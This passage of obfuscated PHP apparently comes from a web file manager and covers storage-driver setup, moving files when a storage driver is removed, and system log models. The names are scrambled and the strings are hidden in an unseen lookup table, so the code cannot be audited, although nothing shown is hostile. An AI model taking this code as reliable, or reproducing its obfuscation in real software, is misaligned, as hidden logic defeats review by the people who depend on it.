(is_string($≈ü˝öë‚)) { $Ñ©æÑØÿ[$º—ñ…Ÿª] = trim($≈ü˝öë‚); } } $Ñ©æÑØÿ[$ÈôÄ™œÏ[2296]] = rand_string(6); $∞Ω¬éÅ = $GLOBALS[$ÈôÄ™œÏ[6]][$ÈôÄ™œÏ[92]][$ÈôÄ™œÏ[898]]; $§ÏÀÍÒÀ = isset($∞Ω¬éÅ[$ØûÚ‹√ ]) ? $∞Ω¬éÅ[$ØûÚ‹√ ] : ucfirst($ØûÚ‹√ ); $êÓ£úË≤ = $ÈôÄ™œÏ[77] . $§ÏÀÍÒÀ; if (!$§ÏÀÍÒÀ || !class_exists($êÓ£úË≤)) { if ($ºò˙Ë‹Ü) { return LNG($ÈôÄ™œÏ[2297]); } write_log(array($ÈôÄ™œÏ[2298], $¬ÛÒ˜Èï, get_caller_info()), $ÈôÄ™œÏ[215]); show_json(LNG($ÈôÄ™œÏ[2297]), !1, $¬ÛÒ˜Èï); } $àÇØ£Üå = new $êÓ£úË≤($Ñ©æÑØÿ); if (in_array($ØûÚ‹√ , $àÇØ£Üå->objectDriver)) { try { if (!$àÇØ£Üå->isBucketCors() && !$àÇØ£Üå->setBucketCors()) { $Ø‘—‰Ò£ = LNG($ÈôÄ™œÏ[2299]); $Ø‘—‰Ò£ .= $ÈôÄ™œÏ[2300] . LNG($ÈôÄ™œÏ[2301]); } } catch (Exception $ååú≤Õ‘) { $Ø‘—‰Ò£ = $ååú≤Õ‘->getMessage(); } if (isset($Ø‘—‰Ò£)) { return $this->_parseError($Ø‘—‰Ò£, $ØûÚ‹√ , $ºò˙Ë‹Ü); } if ($ØûÚ‹√  == $ÈôÄ™œÏ[68] && !$àÇØ£Üå->checkRegion()) { return $this->_parseError(LNG($ÈôÄ™œÏ[2302]), $ØûÚ‹√ , $ºò˙Ë‹Ü); } } $ÌÁ‚Ú⁄˚ = rtrim($Ñ©æÑØÿ[$ÈôÄ™œÏ[1258]], $ÈôÄ™œÏ[8]) . $ÈôÄ™œÏ[8]; $ãÜøçπ‰ = $àÇØ£Üå->getPath($ÌÁ‚Ú⁄˚ . $ÈôÄ™œÏ[1262]); try { if ($ØûÚ‹√  == $ÈôÄ™œÏ[109]) { $àÇØ£Üå->mkdir($ÌÁ‚Ú⁄˚); } $ê∫Íç∂ = $àÇØ£Üå->mkfile($ãÜøçπ‰); if (!$ê∫Íç∂) { $Ø‘—‰Ò£ = LNG($ÈôÄ™œÏ[2299]); } } catch (Exception $ååú≤Õ‘) { $Ø‘—‰Ò£ = $ååú≤Õ‘->getMessage(); } if (isset($Ø‘—‰Ò£)) { return $this->_parseError($Ø‘—‰Ò£, $ØûÚ‹√ , $ºò˙Ë‹Ü); } $Ñ©æÑØÿ[$ÈôÄ™œÏ[1258]] = $ÌÁ‚Ú⁄˚; $¬ÛÒ˜Èï[$ÈôÄ™œÏ[6]] = json_encode($Ñ©æÑØÿ); $¬ÛÒ˜Èï[$ÈôÄ™œÏ[98]] = $§ÏÀÍÒÀ; return !0; } private function _parseError($∫–¶˙Îî, $¶†Æ¨Îç, $™êÔ‚Ù∑ = false) { $£œåÈÉ∫ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($¶†Æ¨Îç == $£œåÈÉ∫[68] && stripos($∫–¶˙Îî, $£œåÈÉ∫[2303])) { $–®◊î∫« = explode($£œåÈÉ∫[10], $∫–¶˙Îî); $Á¶ØÀË¥ = isset($–®◊î∫«[1]) ? $–®◊î∫«[1] : $£œåÈÉ∫[12]; $ÁÃêõˆ = array($£œåÈÉ∫[2304] => LNG($£œåÈÉ∫[2305]), $£œåÈÉ∫[2306] => LNG($£œåÈÉ∫[2307])); if (isset($ÁÃêõˆ[$Á¶ØÀË¥])) { $∫–¶˙Îî = $ÁÃêõˆ[$Á¶ØÀË¥]; } } if (stripos($∫–¶˙Îî, $£œåÈÉ∫[2308]) === 0) { $‘‰”≥—„ = strpos($∫–¶˙Îî, $£œåÈÉ∫[178]); if ($‘‰”≥—„ === !1) { $‘‰”≥—„ = strpos($∫–¶˙Îî, $£œåÈÉ∫[4]); } if ($‘‰”≥—„ !== !1) { $∫–¶˙Îî = substr($∫–¶˙Îî, $‘‰”≥—„ + 1); } } $∫–¶˙Îî = LNG($£œåÈÉ∫[1265]) . $∫–¶˙Îî; if ($™êÔ‚Ù∑) { return $∫–¶˙Îî; } show_json($∫–¶˙Îî, !1); } public function driverListSystem() { $¡†Ó∂ñ◊ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ãﬂä–®˝ = parent::listData(); $ë∂ÇÆ≈© = array(); foreach ($Ãﬂä–®˝ as $£´ÉßÛá) { unset($£´ÉßÛá[$¡†Ó∂ñ◊[231]], $£´ÉßÛá[$¡†Ó∂ñ◊[88]]); $£´ÉßÛá[$¡†Ó∂ñ◊[6]] = json_decode($£´ÉßÛá[$¡†Ó∂ñ◊[6]], !0); $ë∂ÇÆ≈©[] = $£´ÉßÛá; } return $ë∂ÇÆ≈©; } public function defaultDriver() { $£⁄¿¨Á =& $_SERVER[ß⁄ˆÇ†Œ]; $˛ÜÁƒÛæ = parent::listData(); $ËŒœöﬂï = array_filter_by_field($˛ÜÁƒÛæ, $£⁄¿¨Á[37], 1); $ËŒœöﬂï = $ËŒœöﬂï[0]; if ($ËŒœöﬂï) { $ËŒœöﬂï[$£⁄¿¨Á[6]] = json_decode($ËŒœöﬂï[$£⁄¿¨Á[6]], !0); } return $ËŒœöﬂï; } public function driverInfo($úî≥ò›–) { $£Ÿç»æ¥ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ωñõ“√¢ = array_to_keyvalue(parent::listData(), $£Ÿç»æ¥[483]); if (!isset($Ωñõ“√¢[$úî≥ò›–])) { return !1; } $Íä§π˘¿ = $Ωñõ“√¢[$úî≥ò›–]; $Íä§π˘¿[$£Ÿç»æ¥[6]] = json_decode($Íä§π˘¿[$£Ÿç»æ¥[6]], !0); return $Íä§π˘¿; } public function remove($˘¸≥Ü√ë) { $this->removeShareItems($˘¸≥Ü√ë); return parent::remove($˘¸≥Ü√ë); } public function removeWithFile($ÑŸ≠«Ωí, $æ˛ºÑ´å, $∂ÆóåôÄ, $ªöŸ≥Òπ = false) { $Õ–´û∫Ì =& $_SERVER[ß⁄ˆÇ†Œ]; $Ú‰ˆÔìå = array($Õ–´û∫Ì[890] => $ÑŸ≠«Ωí); $¨≈∂áôê = Model($Õ–´û∫Ì[552])->where($Ú‰ˆÔìå)->count(); $”öÍ∆∑– = Model($Õ–´û∫Ì[552])->where($Ú‰ˆÔìå)->sum($Õ–´û∫Ì[79]); $Å∏’åÑà = $æ˛ºÑ´å . $Õ–´û∫Ì[2309] . $ÑŸ≠«Ωí; $á”ÿˆ˘Ù = LNG($æ˛ºÑ´å == $Õ–´û∫Ì[628] ? $Õ–´û∫Ì[2310] : $Õ–´û∫Ì[2311]); $¡¢Ï¡≠Æ = new TaskFileTransfer($Å∏’åÑà, $Õ–´û∫Ì[215], $¨≈∂áôê, $á”ÿˆ˘Ù . $Õ–´û∫Ì[470] . $∂ÆóåôÄ[$Õ–´û∫Ì[32]] . $Õ–´û∫Ì[214] . $ÑŸ≠«Ωí); $¡¢Ï¡≠Æ->task[$Õ–´û∫Ì[836]] = (double) $”öÍ∆∑–; $√ÎÊ¯œ  = KodIO::defaultDriver(); $˛—ø™˛◊ = $√ÎÊ¯œ [$Õ–´û∫Ì[483]]; $û¬íÒº≥ = $◊•©¥˘˜ = $√ÌÁø¯» = array(); $Âû–¿∏ó = Model($Õ–´û∫Ì[230])->where($Ú‰ˆÔìå)->field($Õ–´û∫Ì[2312])->select(); foreach ($Âû–¿∏ó as $¥†Ãå·ã) { $µôÉ˘ûè = $¥†Ãå·ã[$Õ–´û∫Ì[549]]; if ($ªöŸ≥Òπ) { $◊•©¥˘˜[] = $µôÉ˘ûè; continue; } $É‡¶ã™© = $¥†Ãå·ã[$Õ–´û∫Ì[87]]; $êÇû’„≈ = get_path_father($É‡¶ã™©); $√ÌÁø¯»[] = $êÇû’„≈; $êÇû’„≈ = str_replace("\x7b\x69\x6f\x3a{$ÑŸ≠«Ωí}\175\57", "\173\x69\157\72{$˛—ø™˛◊}\x7d\57", $êÇû’„≈); if (!IO::exist($É‡¶ã™©)) { $û¬íÒº≥[] = $µôÉ˘ûè; $¡¢Ï¡≠Æ->updateFileEnd($¥†Ãå·ã[$Õ–´û∫Ì[32]], $¥†Ãå·ã[$Õ–´û∫Ì[79]]); write_log($Õ–´û∫Ì[2313] . $É‡¶ã™©, $Õ–´û∫Ì[1894]); continue; } $˘êôﬂ÷£ = IO::move($É‡¶ã™©, $êÇû’„≈, REPEAT_RENAME); if (!$˘êôﬂ÷£) { $◊•©¥˘˜[] = $µôÉ˘ûè; $¡¢Ï¡≠Æ->updateFileEnd($¥†Ãå·ã[$Õ–´û∫Ì[32]], $¥†Ãå·ã[$Õ–´û∫Ì[79]]); write_log($Õ–´û∫Ì[2314] . $É‡¶ã™©, $Õ–´û∫Ì[1894]); continue; } $Ú‰ˆÔìå = array($Õ–´û∫Ì[549] => $µôÉ˘ûè); $≥ÂÒ£ôÿ = array($Õ–´û∫Ì[890] => $˛—ø™˛◊, $Õ–´û∫Ì[87] => $˘êôﬂ÷£); Model($Õ–´û∫Ì[230])->where($Ú‰ˆÔìå)->save($≥ÂÒ£ôÿ); } $•˚ÔÎﬁÔ = $¡¢Ï¡≠Æ->task; if (!$ªöŸ≥Òπ) { Cache::set($Å∏’åÑà, $•˚ÔÎﬁÔ); } $¡¢Ï¡≠Æ->end(); $û¬íÒº≥ = array_unique($û¬íÒº≥); $◊•©¥˘˜ = array_unique($◊•©¥˘˜); if (!$ªöŸ≥Òπ && ($û¬íÒº≥ || $◊•©¥˘˜)) { $Ü¸É¶≤˘ = array(); if ($û¬íÒº≥) { $Ü¸É¶≤˘[] = sprintf(LNG($Õ–´û∫Ì[2315]), count($û¬íÒº≥)); } if ($◊•©¥˘˜) { $Ü¸É¶≤˘[] = sprintf(LNG($Õ–´û∫Ì[2316]), count($◊•©¥˘˜)); } $Ü¸É¶≤˘ = sprintf(LNG($Õ–´û∫Ì[2317]), implode($Õ–´û∫Ì[2318], $Ü¸É¶≤˘)) . $Õ–´û∫Ì[2319] . date($Õ–´û∫Ì[2320]) . $Õ–´û∫Ì[2321]; if ($æ˛ºÑ´å == $Õ–´û∫Ì[1931]) { $Ü¸É¶≤˘ .= $Õ–´û∫Ì[2322] . LNG($Õ–´û∫Ì[2323]); } $•˚ÔÎﬁÔ[$Õ–´û∫Ì[1260]] = $Ü¸É¶≤˘; Cache::set($Å∏’åÑà, $•˚ÔÎﬁÔ); unset($∂ÆóåôÄ[$Õ–´û∫Ì[6]]); $Å¢Øõ≈¸ = array($Õ–´û∫Ì[483] => $ÑŸ≠«Ωí, $Õ–´û∫Ì[2201] => $Õ–´û∫Ì[628], $Õ–´û∫Ì[32] => $∂ÆóåôÄ[$Õ–´û∫Ì[32]], $Õ–´û∫Ì[1283] => $∂ÆóåôÄ); Hook::trigger($Õ–´û∫Ì[1775], array($Õ–´û∫Ì[1283] => $Å¢Øõ≈¸, $Õ–´û∫Ì[1293] => !0)); show_json($Ü¸É¶≤˘, !1, 100111); } if ($æ˛ºÑ´å == $Õ–´û∫Ì[628]) { return !0; } if ($û¬íÒº≥ || $◊•©¥˘˜) { $È§î›≠ı = array_merge($û¬íÒº≥, $◊•©¥˘˜); $È§î›≠ı = array_filter(array_unique($È§î›≠ı)); $this->removeByFileID($È§î›≠ı); } if ($√ÌÁø¯») { $√ÌÁø¯» = array_filter(array_unique($√ÌÁø¯»)); foreach ($√ÌÁø¯» as $É‡¶ã™©) { $»Ωë˝ª‡ = IO::has($É‡¶ã™©, !0); if (!$»Ωë˝ª‡[$Õ–´û∫Ì[239]] && !$»Ωë˝ª‡[$Õ–´û∫Ì[240]]) { IO::remove($É‡¶ã™©); } } } return $this->remove($ÑŸ≠«Ωí); } private function removeByFileID($íÔ√∆à’ = array()) { $“øÜ˝Î˘ =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($íÔ√∆à’)) { return; } $‹Œæ§è∞ = array($“øÜ˝Î˘[549] => array($“øÜ˝Î˘[7], $íÔ√∆à’)); $àÒ“∂Àê = Model($“øÜ˝Î˘[1414])->where($‹Œæ§è∞)->field($“øÜ˝Î˘[193])->select(); if (!$àÒ“∂Àê) { return Model($“øÜ˝Î˘[552])->remove($íÔ√∆à’); } $àÒ“∂Àê = array_to_keyvalue($àÒ“∂Àê, $“øÜ˝Î˘[12], $“øÜ˝Î˘[193]); foreach ($àÒ“∂Àê as $Ÿø∂±ΩÜ) { Model($“øÜ˝Î˘[897])->removeNow($Ÿø∂±ΩÜ, !1); } } private function removeShareItems($â˘ˆÏ§§) { $Ëüÿ≠ ¨ =& $_SERVER[ß⁄ˆÇ†Œ]; $∫‰◊’πÕ = "\x7b\x69\157\x3a{$â˘ˆÏ§§}\175\x2f"; $ííñ€¥º = array($Ëüÿ≠ ¨[193] => 0, $Ëüÿ≠ ¨[1253] => array($Ëüÿ≠ ¨[467], "{$∫‰◊’πÕ}\x25")); $ÒÇ¯ùﬁ∫ = Model($Ëüÿ≠ ¨[1942])->where($ííñ€¥º)->field($Ëüÿ≠ ¨[673])->select(); if (empty($ÒÇ¯ùﬁ∫)) { return; } $‚ì›”Øè = array_to_keyvalue($ÒÇ¯ùﬁ∫, $Ëüÿ≠ ¨[12], $Ëüÿ≠ ¨[673]); Model($Ëüÿ≠ ¨[672])->remove($‚ì›”Øè); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\114\151\x67\150\164\101\160\x70"; public $modelType = "\x53\x79\163\164\x65\155\117\160\x74\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\x67\x72\157\165\160", "\144\145\163\x63", "\x63\x6f\x6e\x74\145\x6e\x74"); public function listData($˙¬≈ˆÃ˜ = false, $Ëùÿ¬åÜ = "\x6d\157\144\x69\x66\x79\124\151\155\x65", $∑ÑÀﬂ∆≥ = true) { return parent::listData($˙¬≈ˆÃ˜, $Ëùÿ¬åÜ, $∑ÑÀﬂ∆≥); } public function remove($‘å§äº¢) { $Ä˘Ã˚Ä¢ = $this->findByName($‘å§äº¢); if (!$Ä˘Ã˚Ä¢) { return !1; } return parent::remove($Ä˘Ã˚Ä¢[$_SERVER[ß⁄ˆÇ†Œ][483]]); } public function add($¸ΩùÂóô) { if ($this->findByName($¸ΩùÂóô[$_SERVER[ß⁄ˆÇ†Œ][32]])) { return !1; } return parent::insert($¸ΩùÂóô); } public function update($˝—«ﬂÍÚ, $€¥äÇŸ¨) { $À«˝Ï» =& $_SERVER[ß⁄ˆÇ†Œ]; $ƒ˝ßÀÌÅ = $this->findByName($˝—«ﬂÍÚ); $à£¢Úà¯ = $this->findByName($€¥äÇŸ¨[$À«˝Ï»[32]]); if (!$ƒ˝ßÀÌÅ || $à£¢Úà¯ && $à£¢Úà¯[$À«˝Ï»[483]] != $ƒ˝ßÀÌÅ[$À«˝Ï»[483]]) { return !1; } return parent::update($ƒ˝ßÀÌÅ[$À«˝Ï»[483]], $€¥äÇŸ¨); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\155\x5f\154\x6f\x67"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\x54\151\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\163\145\162\164", "\x66\165\x6e\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¥ÎÀû¿À =& $_SERVER[ß⁄ˆÇ†Œ]; return array($¥ÎÀû¿À[2324] => LNG($¥ÎÀû¿À[2325]), $¥ÎÀû¿À[2326] => LNG($¥ÎÀû¿À[2327]), $¥ÎÀû¿À[1905] => LNG($¥ÎÀû¿À[2328]), $¥ÎÀû¿À[2329] => LNG($¥ÎÀû¿À[2330]), $¥ÎÀû¿À[2331] => LNG($¥ÎÀû¿À[2332]), $¥ÎÀû¿À[2333] => LNG($¥ÎÀû¿À[2334]), $¥ÎÀû¿À[2335] => LNG($¥ÎÀû¿À[2336]), $¥ÎÀû¿À[1935] => LNG($¥ÎÀû¿À[2336]), $¥ÎÀû¿À[1936] => LNG($¥ÎÀû¿À[2337]), $¥ÎÀû¿À[2338] => LNG($¥ÎÀû¿À[2339]), $¥ÎÀû¿À[2340] => LNG($¥ÎÀû¿À[2341]), $¥ÎÀû¿À[2342] => LNG($¥ÎÀû¿À[2343]), $¥ÎÀû¿À[2344] => LNG($¥ÎÀû¿À[2345]), $¥ÎÀû¿À[1933] => LNG($¥ÎÀû¿À[2346]), $¥ÎÀû¿À[2347] => LNG($¥ÎÀû¿À[2348]), $¥ÎÀû¿À[1940] => LNG($¥ÎÀû¿À[2349]), $¥ÎÀû¿À[2350] => LNG($¥ÎÀû¿À[2351]), $¥ÎÀû¿À[2352] => LNG($¥ÎÀû¿À[2353]), $¥ÎÀû¿À[2354] => LNG($¥ÎÀû¿À[2355]), $¥ÎÀû¿À[2356] => LNG($¥ÎÀû¿À[2357]), $¥ÎÀû¿À[1943] => LNG($¥ÎÀû¿À[2358]), $¥ÎÀû¿À[1944] => LNG($¥ÎÀû¿À[2359]), $¥ÎÀû¿À[2360] => LNG($¥ÎÀû¿À[2361]), $¥ÎÀû¿À[2362] => LNG($¥ÎÀû¿À[2363]), $¥ÎÀû¿À[2364] => LNG($¥ÎÀû¿À[2365]), $¥ÎÀû¿À[1938] => LNG($¥ÎÀû¿À[2366]), $¥ÎÀû¿À[2367] => LNG($¥ÎÀû¿À[2368]), $¥ÎÀû¿À[1937] => LNG($¥ÎÀû¿À[2369]), $¥ÎÀû¿À[2370] => LNG($¥ÎÀû¿À[2371]), $¥ÎÀû¿À[2372] => LNG($¥ÎÀû¿À[2373]), $¥ÎÀû¿À[2374] => LNG($¥ÎÀû¿À[2373]), $¥ÎÀû¿À[2375] => LNG($¥ÎÀû¿À[2376]), $¥ÎÀû¿À[2377] => LNG($¥ÎÀû¿À[2377]), $¥ÎÀû¿À[2378] => LNG($¥ÎÀû¿À[1909]), $¥ÎÀû¿À[2379] => LNG($¥ÎÀû¿À[2380]), $¥ÎÀû¿À[2381] => LNG($¥ÎÀû¿À[2382]), $¥ÎÀû¿À[2383] => LNG($¥ÎÀû¿À[2384]), $¥ÎÀû¿À[2385] => LNG($¥ÎÀû¿À[2386]), $¥ÎÀû¿À[2387] => LNG($¥ÎÀû¿À[2388]), $¥ÎÀû¿À[2389] => LNG($¥ÎÀû¿À[2389]), $¥ÎÀû¿À[2390] => LNG($¥ÎÀû¿À[2391]), $¥ÎÀû¿À[2392] => LNG($¥ÎÀû¿À[2393]), $¥ÎÀû¿À[2394] => LNG($¥ÎÀû¿À[2395]), $¥ÎÀû¿À[2396] => LNG($¥ÎÀû¿À[2397]), $¥ÎÀû¿À[2398] => LNG($¥ÎÀû¿À[2399]), $¥ÎÀû¿À[2400] => LNG($¥ÎÀû¿À[2401]), $¥ÎÀû¿À[212] => LNG($¥ÎÀû¿À[212]), $¥ÎÀû¿À[213] => LNG($¥ÎÀû¿À[2402]), $¥ÎÀû¿À[2403] => LNG($¥ÎÀû¿À[2403])); } private function typeFile() { $ΩŸ°Ω¬« =& $_SERVER[ß⁄ˆÇ†Œ]; $˝¸≠ôû∫ = array($ΩŸ°Ω¬«[1940] => array($ΩŸ°Ω¬«[1941]), $ΩŸ°Ω¬«[2342] => array($ΩŸ°Ω¬«[2404]), $ΩŸ°Ω¬«[2344] => array($ΩŸ°Ω¬«[2405]), $ΩŸ°Ω¬«[1933] => array($ΩŸ°Ω¬«[1934], $ΩŸ°Ω¬«[2406]), $ΩŸ°Ω¬«[2352] => array(), $ΩŸ°Ω¬«[2354] => array(), $ΩŸ°Ω¬«[2356] => array(), $ΩŸ°Ω¬«[1943] => array($ΩŸ°Ω¬«[1945]), $ΩŸ°Ω¬«[1944] => array($ΩŸ°Ω¬«[1945]), $ΩŸ°Ω¬«[2360] => array($ΩŸ°Ω¬«[2407]), $ΩŸ°Ω¬«[2362] => array($ΩŸ°Ω¬«[2407]), $ΩŸ°Ω¬«[2364] => array($ΩŸ°Ω¬«[2408]), $ΩŸ°Ω¬«[2350] => array($ΩŸ°Ω¬«[2409]), $ΩŸ°Ω¬«[1938] => array($ΩŸ°Ω¬«[2410]), $ΩŸ°Ω¬«[2367] => array($ΩŸ°Ω¬«[2411]), $ΩŸ°Ω¬«[1937] => array($ΩŸ°Ω¬«[1939])); return $˝¸≠ôû∫; } private function typeAll() { $Á©˘•≥Ë =& $_SERVER[ß⁄ˆÇ†Œ]; $úª‡ïßº = $this->typeList; $ı ôÚì˚ = array_filter($this->typeFile()); foreach ($ı ôÚì˚ as $∂ê˛ÇÙÊ => $Ê¨¿ôˆ›) { $úª‡ïßº[$Ê¨¿ôˆ›[0]] = $úª‡ïßº[$∂ê˛ÇÙÊ]; } $úª‡ïßº[$Á©˘•≥Ë[1945]] = LNG($Á©˘•≥Ë[2412]); $úª‡ïßº[$Á©˘•≥Ë[2407]] = LNG($Á©˘•≥Ë[2413]); return $úª‡ïßº; } public function addLog($úıÉ†ë¯, $ı∑√—£ı = array()) { $≠Ûæƒº¸ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($this->typeList[$úıÉ†ë¯])) { return; } $‹œé†ßÎ = Session::get($≠Ûæƒº¸[2104]); if (!$‹œé†ßÎ) { $‹œé†ßÎ = _get($ı∑√—£ı, $≠Ûæƒº¸[1764], 0); } if ($úıÉ†ë¯ == $≠Ûæƒº¸[2379] && is_array($ı∑√—£ı[$≠Ûæƒº¸[2414]]) && !$ı∑√—£ı[$≠Ûæƒº¸[2414]]) { return; } $¸⁄⁄∆Ï∞ = get_client_ip(); if (!$ı∑√—£ı || strlen(json_encode($ı∑√—£ı)) >= 1024 * 64) { if ($ı∑√—£ı && is_array($ı∑√—£ı)) { $ı∑√—£ı = array_intersect_key($ı∑√—£ı, array_flip($≠Ûæƒº¸[483], $≠Ûæƒº¸[32])); $ı∑√—£ı[$≠Ûæƒº¸[2415]] = $¸⁄⁄∆Ï∞; } else { $ı∑√—£ı = array($≠Ûæƒº¸[2415] => $¸⁄⁄∆Ï∞); } } else { if (is_array($ı∑√—£ı)) { $ı∑√—£ı[$≠Ûæƒº¸[2415]] = $¸⁄⁄∆Ï∞; } else { $ı∑√—£ı = array($≠Ûæƒº¸[1283] => $ı∑√—£ı, $≠Ûæƒº¸[2415] => $¸⁄⁄∆Ï∞); } } $ı∑√—£ı = array($≠Ûæƒº¸[1754] => Session::sign(), $≠Ûæƒº¸[1755] => intval($‹œé†ßÎ), $≠Ûæƒº¸[33] => $úıÉ†ë¯, $≠Ûæƒº¸[1757] => json_encode($ı∑√—£ı)); parent::add($ı∑√—£ı); } public function remove($Ë—˛Ñùò) { $this->where(array($_SERVER[ß⁄ˆÇ†Œ][501] => $Ë—˛Ñùò))->delete(); } private function _makeOrder($Ë°¶∞º = '') { $ ‚ö“É€ =& $_SERVER[ß⁄ˆÇ†Œ]; $¸ûﬁ±Ω = $ ‚ö“É€[231]; $…Œ◊°Ü∫ = array($ ‚ö“É€[531] => $ ‚ö“É€[532], $ ‚ö“É€[533] => $ ‚ö“É€[534]); $©ùÚæ‘® = Input::get($ ‚ö“É€[539], $ ‚ö“É€[7], $ ‚ö“É€[2140], array($ ‚ö“É€[2058], $ ‚ö“É€[533])); $©ùÚæ‘® = $…Œ◊°Ü∫[$©ùÚæ‘®]; $Ë°¶∞º = $Ë°¶∞º . "{$¸ûﬁ±Ω}\40{$©ùÚæ‘®}"; return $this->order($Ë°¶∞º); } public function get($ˆ“ãøüÄ = '') { $∆ßÉâóö =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ˆ“ãøüÄ) { show_json(array()); } $˙‘ÓÁÜﬁ = array(); if ($ˆ“ãøüÄ[$∆ßÉâóö[1764]]) { $˙‘ÓÁÜﬁ[$∆ßÉâóö[1764]] = $ˆ“ãøüÄ[$∆ßÉâóö[1764]]; } if (isset($ˆ“ãøüÄ[$∆ßÉâóö[833]])) { $¯ùø¨æ” = $ˆ“ãøüÄ[$∆ßÉâóö[833]]; $œÿ≤¬©® = isset($ˆ“ãøüÄ[$∆ßÉâóö[834]]) ? $ˆ“ãøüÄ[$∆ßÉâóö[834]] : time(); $˙‘ÓÁÜﬁ[$∆ßÉâóö[231]] = array($∆ßÉâóö[418], array($¯ùø¨æ”, $œÿ≤¬©®)); } if ($ˆ“ãøüÄ[$∆ßÉâóö[33]]) { $æ“’à´Ä = explode($∆ßÉâóö[50], $ˆ“ãøüÄ[$∆ßÉâóö[33]]); $”úœ«Ú§ = $this->typeFile(); $ÙñÄöÒÍ = array(); foreach ($æ“’à´Ä as $ªú∏Çﬁü) { $ÙñÄöÒÍ[] = $ªú∏Çﬁü; if (isset($”úœ«Ú§[$ªú∏Çﬁü])) { $ÙñÄöÒÍ = array_merge($ÙñÄöÒÍ, $”úœ«Ú§[$ªú∏Çﬁü]); } } $ÙñÄöÒÍ = array_unique($ÙñÄöÒÍ); if ($ÙñÄöÒÍ) { $˙‘ÓÁÜﬁ[$∆ßÉâóö[33]] = array($∆ßÉâóö[7], $ÙñÄöÒÍ); } } else { $˙‘ÓÁÜﬁ[$∆ßÉâóö[33]] = array($∆ßÉâóö[2416], $∆ßÉâóö[2417]); } if (!empty($ˆ“ãøüÄ[$∆ßÉâóö[2415]])) { $˙‘ÓÁÜﬁ[$∆ßÉâóö[534]] = array($∆ßÉâóö[467], "\45{$ˆ“ãøüÄ[$∆ßÉâóö[2415]]}\x25"); } $ﬂ™Êπ˚ï = $this->_makeOrder()->where($˙‘ÓÁÜﬁ)->selectPage(); if (empty($ﬂ™Êπ˚ï[$∆ßÉâóö[454]])) { show_json(array(), !0, $ﬂ™Êπ˚ï[$∆ßÉâóö[451]]); } $ﬂ™Êπ˚ï[$∆ßÉâóö[454]] = $this->logList($ﬂ™Êπ˚ï[$∆ßÉâóö[454]]); return $ﬂ™Êπ˚ï; } private function ipAddress(&$«Çå°Äˆ) { $Î‹‡õ§‚ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!empty($«Çå°Äˆ[$Î‹‡õ§‚[2415]])) { $àÁ‹«…ﬁ = IpLocation::get($«Çå°Äˆ[$Î‹‡õ§‚[2415]]); } else { $àÁ‹«…ﬁ = LNG($Î‹‡õ§‚[2418]); } $«Çå°Äˆ[$Î‹‡õ§‚[2419]] = $àÁ‹«…ﬁ; } private function descZipDownload($ËµŸ†Ì≈, &$îŒÅ‘ß∆) { $ﬂâ∂Œ†ü =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($ËµŸ†Ì≈[$ﬂâ∂Œ†ü[2420]])) { return; } $¶µûﬂœ» = json_decode($ËµŸ†Ì≈[$ﬂâ∂Œ†ü[2420]], !0); foreach ($¶µûﬂœ» as $µ™äÍàà) { try { $§Ô»Û É = IO::infoFullSimple($µ™äÍàà[$ﬂâ∂Œ†ü[87]]); } catch (Exception $Éˆèòé›) { continue; } $ËµŸ†Ì≈[$ﬂâ∂Œ†ü[87]] = $µ™äÍàà[$ﬂâ∂Œ†ü[87]]; $îŒÅ‘ß∆[] = $ËµŸ†Ì≈[$ﬂâ∂Œ†ü[193]] = $§Ô»Û É[$ﬂâ∂Œ†ü[193]]; $îŒÅ‘ß∆[] = $ËµŸ†Ì≈[$ﬂâ∂Œ†ü[2196]] = $§Ô»Û É[$ﬂâ∂Œ†ü[192]]; break; } return $ËµŸ†Ì≈; } private function getSourceList(&$óÍı§ˆÜ) { $ú⁄—‘πñ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÿ»˙ËÏ≥ = array(); foreach ($óÍı§ˆÜ as $øê…íêÆ => $πÄï’ƒ≠) { $≥ü˝¿ôÅ = json_decode($πÄï’ƒ≠[$ú⁄—‘πñ[534]], !0); if ($πÄï’ƒ≠[$ú⁄—‘πñ[33]] == $ú⁄—‘πñ[1936]) { $≥ü˝¿ôÅ = $this->descZipDownload($≥ü˝¿ôÅ, $ÿ»˙ËÏ≥); $óÍı§ˆÜ[$øê…íêÆ][$ú⁄—‘πñ[534]] = json_encode($≥ü˝¿ôÅ); continue; } if (strpos($πÄï’ƒ≠[$ú⁄—‘πñ[33]], $ú⁄—‘πñ[2198]) !== 0) { if (!isset($≥ü˝¿ôÅ[$ú⁄—‘πñ[87]]) || strpos($πÄï’ƒ≠[$ú⁄—‘πñ[33]], $ú⁄—‘πñ[2421]) !== 0) { continue; } try { $◊Í¥ôÅÕ = IO::infoFullSimple($≥ü˝¿ôÅ[$ú⁄—‘πñ[87]]); } catch (Exception $∂¢œÎÓ∑) { continue; } $ÿ»˙ËÏ≥[] = $≥ü˝¿ôÅ[$ú⁄—‘πñ[193]] = $◊Í¥ôÅÕ[$ú⁄—‘πñ[193]]; $ÿ»˙ËÏ≥[] = $≥ü˝¿ôÅ[$ú⁄—‘πñ[2196]] = $◊Í¥ôÅÕ[$ú⁄—‘πñ[192]]; $óÍı§ˆÜ[$øê…íêÆ][$ú⁄—‘πñ[534]] = json_encode($≥ü˝¿ôÅ); continue; } $ÿ»˙ËÏ≥[] = $≥ü˝¿ôÅ[$ú⁄—‘πñ[193]]; $ÿ»˙ËÏ≥[] = $≥ü˝¿ôÅ[$ú⁄—‘πñ[2196]]; if ($≥ü˝¿ôÅ[$ú⁄—‘πñ[33]] == $ú⁄—‘πñ[628]) { $ÿ»˙ËÏ≥[] = $≥ü˝¿ôÅ[$ú⁄—‘πñ[534]][$ú⁄—‘πñ[1237]]; $ÿ»˙ËÏ≥[] = 